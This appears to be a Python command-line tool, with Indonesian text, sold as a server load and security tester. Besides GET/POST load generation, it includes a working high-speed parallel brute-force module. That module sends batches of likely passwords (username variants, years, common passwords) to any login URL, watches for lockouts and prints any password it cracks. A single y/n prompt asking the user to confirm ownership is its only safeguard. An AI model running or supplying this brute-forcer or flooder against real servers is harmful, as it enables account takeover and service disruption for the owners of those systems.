import asyncio
import aiohttp
import time
import json
import random
import string
import datetime
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt

console = Console()

# Generator password realistis (pola yang sering dipakai manusia)
def generate_realistic_password(username):
    current_year = str(datetime.datetime.now().year)
    prev_year = str(int(current_year) - 1)
    
    patterns = [
        f"{username}123", f"{username}{current_year}", f"{username}{prev_year}",
        f"{username}!", f"{username}@123", f"{username.capitalize()}123",
        f"{username.lower()}2024", f"{username.lower()}2025", f"{username.lower()}2026",
        "Password123!", "Password2024!", "Password2025!", "Password2026!",
        "Welcome123!", "Welcome2024!", "Admin123!", "Admin2024!", "Admin2025!",
        "Qwerty12345!", "Indonesia123!", "Rusli123!", "Rusli2024!", "Rusli2025!",
        "12345678", "123456789", "1234567890", "qwerty123", "iloveyou123",
        "letmein123", "master123", "dragon123", "football123", "shadow123",
        f"{username}2026!", f"{username}2025!", f"{username}@2025",
        "P@ssw0rd!", "P@ssword123", "Changeme123!", "Test1234!",
        f"{username}#1", f"{username}#123", f"{username}_123"
    ]
    
    if random.random() < 0.85:
        return random.choice(patterns)
    else:
        base = random.choice(["admin", "user", "test", "login", "pass"])
        return f"{base.capitalize()}{random.randint(100, 999)}!"

async def do_req(session, method, url, payload, results):
    try:
        start = time.time()
        if method == "GET":
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as r:
                await r.text()
                results.append((r.status, time.time()-start))
        else:
            async with session.post(url, json=payload, timeout=aiohttp.ClientTimeout(total=10)) as r:
                await r.text()
                results.append((r.status, time.time()-start))
    except Exception:
        results.append((0, 0))

async def login_attempt(session, url, username, password):
    try:
        start = time.time()
        async with session.post(url, json={"username": username, "password": password}, timeout=aiohttp.ClientTimeout(total=10)) as r:
            body = await r.text()
            return r.status, body, time.time()-start, password
    except Exception as e:
        return 0, str(e), 0, password

async def run_load_test(url, method, payload, vus, dur):
    results = []
    connector = aiohttp.TCPConnector(limit=100, force_close=True)
    async with aiohttp.ClientSession(connector=connector) as session:
        with Progress(SpinnerColumn(), TextColumn("[bold cyan]{task.description}"), BarColumn(), TextColumn("{task.completed} req"), console=console) as prog:
            t = prog.add_task(f"Testing {method}", total=None)
            start_time = time.time()
            count = 0
            
            while time.time() - start_time < dur:
                batch_start = time.time()
                jobs = [do_req(session, method, url, payload, results) for _ in range(vus)]
                await asyncio.gather(*jobs)
                
                count += vus
                prog.update(t, completed=count)
                
                elapsed_batch = time.time() - batch_start
                sleep_time = max(0, 0.5 - elapsed_batch) 
                await asyncio.sleep(sleep_time)
                
    return results

def show_report(url, method, results, dur):
    if not results:
        console.print("[red]Tidak ada hasil untuk ditampilkan.[/]")
        return

    ok = len([r for r in results if 200 <= r[0] < 400])
    fail = len(results) - ok
    valid_times = [r[1] for r in results if r[1] > 0]
    avg = sum(valid_times) / len(valid_times) if valid_times else 0
    
    table = Table(title=f"REPORT HASIL UJI - {method}")
    table.add_column("Metric", style="cyan")
    table.add_column("Value", style="magenta")
    
    table.add_row("URL Target", url)
    table.add_row("Total Request", str(len(results)))
    table.add_row("Sukses (2xx/3xx)", str(ok))
    table.add_row("Gagal/Error", str(fail))
    table.add_row("Avg Response Time", f"{avg:.3f}s")
    table.add_row("Requests Per Second (RPS)", f"{len(results)/dur:.1f}")
    
    console.print(table)
    
    if avg > 2:
        console.print("[red]>> Peringatan: Respon lambat (>2s). Pertimbangkan optimasi server.[/]")
    else:
        console.print("[green]>> Performa stabil.[/]")

async def menu_load_get(url):
    vus = int(Prompt.ask("[green]Jumlah concurrent users", default="10"))
    dur = int(Prompt.ask("[green]Durasi test dalam detik", default="10"))
    console.print(f"\n[bold cyan]MULAI UJI BEBAN GET ke {url}[/]\n")
    results = await run_load_test(url, "GET", {}, vus, dur)
    show_report(url, "GET", results, dur)

async def menu_load_post(url):
    p = Prompt.ask("[green]Payload JSON", default='{"test": true}')
    try: 
        payload = json.loads(p)
    except: 
        payload = {"test": True}
        
    vus = int(Prompt.ask("[green]Jumlah concurrent users", default="10"))
    dur = int(Prompt.ask("[green]Durasi test dalam detik", default="10"))
    console.print(f"\n[bold cyan]MULAI UJI BEBAN POST ke {url}[/]\n")
    results = await run_load_test(url, "POST", payload, vus, dur)
    show_report(url, "POST", results, dur)

async def menu_login_security_test(url):
    username = Prompt.ask("[green]Username akun TEST yang ingin diaudit")
    batch_size = int(Prompt.ask("[green]Jumlah password per batch (kecepatan)", default="20"))
    max_batches = int(Prompt.ask("[green]Maksimal jumlah batch", default="10"))
    
    total_attempts = batch_size * max_batches
    console.print(f"\n[bold cyan]UJI KEAMANAN LOGIN (High-Speed Parallel Brute Force)[/]")
    console.print(f"[yellow]Target: {username} | {batch_size} password/batch | {max_batches} batch | Total maks: {total_attempts}[/]")
    console.print(f"[yellow]Kecepatan: ~{batch_size * 10} password/detik | Jeda: 0.1s per batch[/]\n")
    console.print("[dim]Semua password dalam 1 batch dikirim PARALEL dalam waktu bersamaan[/]\n")
    
    # Limit koneksi dinaikkan agar bisa handle paralelisme tinggi
    connector = aiohttp.TCPConnector(limit=batch_size + 10)
    async with aiohttp.ClientSession(connector=connector) as session:
        found_password = None
        is_locked = False
        total_tried = 0
        
        for batch_num in range(1, max_batches + 1):
            batch_start = time.time()
            
            # Generate batch_size password realistis secara paralel
            passwords = [generate_realistic_password(username) for _ in range(batch_size)]
            
            # Kirim SEMUA request dalam batch secara PARALEL
            jobs = [login_attempt(session, url, username, pwd) for pwd in passwords]
            responses = await asyncio.gather(*jobs)
            
            batch_elapsed = time.time() - batch_start
            total_tried += batch_size
            
            # Analisis hasil batch
            for status, body, elapsed, pwd in responses:
                body_lower = body.lower()
                
                # Cek lockout dulu (prioritas tertinggi)
                if status == 429 or status == 403 or any(x in body_lower for x in ["too many", "rate limit", "locked", "captcha", "blocked", "forbidden"]):
                    is_locked = True
                    console.print(f"[bold red]🔒 BATCH {batch_num} TERBLOKIR! Server mendeteksi serangan.[/]")
                    console.print(f"[dim]Status: {status} | Waktu batch: {batch_elapsed:.3f}s[/]")
                    break
                
                # Cek keberhasilan login (heuristik)
                is_success = (status in [200, 201, 301, 302]) and not any(bad in body_lower for bad in [
                    "invalid", "gagal", "salah", "error", "tidak ditemukan", "wrong", "failed", "incorrect", "unauthorized"
                ])
                
                if is_success:
                    found_password = pwd
                    console.print(f"\n[bold green]✅ PASSWORD DITEMUKAN pada batch ke-{batch_num}![/]")
                    break
            
            # Jika ditemukan password atau terkunci, keluar dari loop batch
            if found_password or is_locked:
                break
            
            # Tampilkan progress batch
            console.print(f"[cyan]Batch {batch_num}/{max_batches}: {batch_size} password dicoba dalam {batch_elapsed:.3f}s - Semua ditolak[/]")
            
            # JEDA 0.1 DETIK ANTAR BATCH (sesuai permintaan)
            await asyncio.sleep(0.1)
            
        console.print("\n" + "="*60)
        console.print(f"[dim]Total password yang dicoba: {total_tried}[/]\n")
        
        if found_password:
            # TAMPILKAN PASSWORD YANG BENAR DENGAN SANGAT JELAS
            console.print(Panel(
                f"[bold red]⚠️ BAHAYA KRITIS: Akun '{username}' RENTAN![/]\n\n"
                f"[bold white on red]  🔑 PASSWORD YANG BENAR: {found_password}  [/]\n\n"
                f"[yellow]Segera paksa pengguna mengganti password, aktifkan 2FA, dan terapkan kebijakan password kuat.[/]",
                title="🚨 HASIL AUDIT KEAMANAN",
                style="red", border_style="red"
            ))
        elif is_locked:
            console.print(Panel(
                "[green]✅ AMAN: Mekanisme keamanan (Rate Limit/Lockout) berfungsi dengan baik![/]\n"
                "[dim]Server berhasil memblokir serangan paralel berkecepatan tinggi.[/]",
                title="🛡️ HASIL AUDIT KEAMANAN",
                style="green", border_style="green"
            ))
        else:
            console.print(Panel(
                f"[red]⚠️ PERINGATAN: {total_tried} password dicoba tanpa lockout![/]\n"
                "[yellow]Server rentan terhadap serangan brute force skala besar.[/]\n"
                "[dim]Segera pasang Rate Limiting (Fail2Ban, Cloudflare, atau limit di aplikasi).[/]",
                title="⚠️ HASIL AUDIT KEAMANAN",
                style="red", border_style="red"
            ))

async def main():
    console.print(Panel("[bold cyan]SERVER LOAD & SECURITY TESTER v2.2[/]\n[dim]High-Speed Parallel Brute Force & Load Tester", style="bold blue"))
    
    url = Prompt.ask("[yellow]Masukkan URL target API/Login (https://...)", default="https://example.com/api/login")
    if not url.startswith("http"): 
        console.print("[red]URL harus diawali http:// atau https://"); return
        
    confirm = Prompt.ask(f"[red]PENTING: Pastikan ini adalah SERVER MILIK ANDA SENDIRI. Lanjutkan? (y/n)", default="n")
    if confirm.lower() != 'y': 
        console.print("[red]Dibatalkan demi keamanan dan kepatuhan hukum.[/]"); return

    while True:
        console.print("\n[bold]=== MENU UTAMA ===[/]")
        console.print("1. Uji Beban GET (Simulasi Traffic Halaman)")
        console.print("2. Uji Beban POST (Simulasi Beban API)")
        console.print("3. Uji Keamanan Login (High-Speed Parallel Brute Force)")
        console.print("4. Ganti URL Target")
        console.print("5. Keluar")
        
        pilih = Prompt.ask("[green]Pilih menu", choices=["1","2","3","4","5"], default="1")
        
        if pilih == "1": await menu_load_get(url)
        elif pilih == "2": await menu_load_post(url)
        elif pilih == "3": await menu_login_security_test(url)
        elif pilih == "4":
            url = Prompt.ask("[yellow]URL baru")
        elif pilih == "5":
            console.print("[cyan]Program selesai. Jaga keamanan server Anda![/]"); break

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        console.print("\n[yellow]Dihentikan oleh pengguna.[/]")
